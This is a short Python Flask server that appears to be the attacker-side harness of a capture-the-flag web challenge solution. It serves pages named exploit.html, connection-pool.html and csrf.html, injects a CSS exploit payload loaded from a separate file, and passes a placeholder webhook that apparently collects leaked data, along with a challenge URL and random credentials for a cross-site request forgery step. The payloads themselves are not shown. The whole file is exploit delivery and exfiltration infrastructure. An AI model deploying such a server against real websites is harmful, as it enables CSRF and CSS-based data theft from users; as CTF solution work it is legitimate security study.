import string
import random

from flask import Flask, render_template

import gen_css

app = Flask(__name__)

FLAG = ""
URL = "xxxxxxxxxxxxxxxxxxx"
WEBHOOK = "xxxxxxxxxxxxxxxxxxxxxxx"


@app.get("/")
def index():
    return render_template("exploit.html", webhook=WEBHOOK)

@app.get("/connection-pool")
def connection_palle():
    return render_template("connection-pool.html", webhook=WEBHOOK)

@app.get("/csrf")
def csrf():
    with open("exploit-css.html", "r") as f:
        cssexploit = f.read()

    username =''.join([random.choice(string.ascii_lowercase) for _ in range(32)])
    password = ''.join([random.choice(string.digits) for _ in range(6)])
    
    print("user", username, "passw", password)

    return render_template("csrf.html", 
                           chall_url=URL, 
                           css_payload=cssexploit, 
                           random_username=username, 
                           random_password=password,
                           webhook=WEBHOOK)

if __name__ == "__main__":
    app.run("0.0.0.0", 4004)
